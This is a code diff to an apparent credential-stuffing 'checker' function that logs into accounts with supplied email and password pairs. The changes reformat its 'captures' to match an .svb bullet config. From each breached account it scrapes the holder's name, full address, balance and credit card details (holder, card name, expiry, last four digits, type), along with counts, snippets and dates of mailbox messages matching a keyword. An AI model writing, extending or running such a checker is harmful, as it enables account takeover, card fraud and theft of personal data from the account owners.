@@ -351,12 +351,14 @@ def _attempt_check(email, password, search_keyword=None):
 
                 pay_body = pay_resp.text
 
-                # Name
+                # ── Captures matching .svb config (clean format) ──
+
+                # CAP "Name"
                 name = _parse_lr(pay_body, '"accountHolderName":"', '"')
                 if name:
                     result["captures"]["Name"] = name
 
-                # Address
+                # CAP "Full Addy" — Address, City, State, Postalcode
                 addr1 = _parse_lr(pay_body, '"address":{"address_line1":"', '"')
                 try:
                     pay_json = pay_resp.json()
@@ -371,15 +373,16 @@ def _attempt_check(email, password, search_keyword=None):
                     region = _parse_lr(pay_body, '"region":"', '"')
                     zipcode = _parse_lr(pay_body, '"postal_code":"', '"')
 
-                if addr1 or city:
-                    result["captures"]["Address"] = f"{addr1}, {city}, {region}, {zipcode}".strip(", ")
+                parts = [p for p in [addr1, city, region, zipcode] if p]
+                if parts:
+                    result["captures"]["Full Addy"] = f"{addr1} | {city} | {region} | {zipcode}"
 
-                # Balance
+                # CAP "Balance"
                 balance = _parse_lr(pay_body, 'balance":', ',"')
                 if balance:
                     result["captures"]["Balance"] = f"${balance}"
 
-                # Credit card info
+                # CAP "CC Info" — CardHolder | CC | Month | Year | Last4 | Funding
                 cc_holder = _parse_lr(pay_body, 'accountHolderName":"', '","')
                 cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
                 exp_month = _parse_lr(pay_body, 'expiryMonth":"', '",')
@@ -388,10 +391,12 @@ def _attempt_check(email, password, search_keyword=None):
                 card_type = _parse_lr(pay_body, '"cardType":"', '"')
 
                 if cc_name or last4:
-                    cc_info = f"{cc_name} ****{last4} {exp_month}/{exp_year} ({card_type})"
-                    result["captures"]["CC"] = cc_info.strip()
+                    result["captures"]["CC Info"] = (
+                        f"Holder: {cc_holder} | Card: {cc_name} | "
+                        f"Exp: {exp_month}/{exp_year} | Last4: {last4} | Type: {card_type}"
+                    )
 
-                # Country
+                # CAP "Country"
                 country_code = _parse_lr(pay_body, '"country":"', '"')
                 if country_code:
                     result["captures"]["Country"] = COUNTRY_MAP.get(country_code, country_code)
@@ -492,25 +497,26 @@ def _attempt_check(email, password, search_keyword=None):
 
                 search_text = search_resp.text
 
-                # Total messages
+                # CAP "Total Msg From <keyword>"
                 total_msgs = _parse_lr(search_text, '"Total":', ',')
                 if not total_msgs:
                     try:
                         total_msgs = str(search_resp.json().get("Total", "0"))
                     except Exception:
                         total_msgs = "0"
-                result["captures"][f"{search_keyword} Msgs"] = total_msgs.strip()
+                kw_upper = search_keyword.upper()
+                result["captures"][f"Total Msg From {kw_upper}"] = total_msgs.strip()
 
-                # Last message snippet
+                # CAP "Last MSG From Mail"
                 snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')
                 snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
                 if snippet:
-                    result["captures"]["Last Msg"] = snippet[:120]
+                    result["captures"]["Last MSG From Mail"] = snippet[:120]
 
-                # Last delivery date
+                # CAP "Last Mail Msg" (date)
                 last_date = _parse_lr(search_text, '"LastDeliveryTime":"', 'T')
                 if last_date:
-                    result["captures"]["Last Date"] = last_date
+                    result["captures"]["Last Mail Msg"] = last_date
 
             except Exception:
                 pass
